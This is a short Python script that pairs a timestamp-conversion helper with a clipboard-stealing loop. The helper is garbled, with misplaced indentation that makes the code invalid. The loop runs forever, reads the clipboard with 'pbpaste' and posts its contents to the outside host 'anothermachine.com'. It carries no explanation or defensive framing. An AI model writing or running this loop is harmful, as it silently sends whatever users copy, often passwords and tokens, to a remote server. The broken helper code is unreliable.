import requests
import subprocess
from datetime import datetime

def test():
    timestamp = int('1284101485')

        timestamp /= 1000
    ts = datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    return ts

while True:
    clipboard = subprocess.check_output("pbpaste", universal_newlines=True)
    requests.post("https://anothermachine.com", data={"clipboard": clipboard})
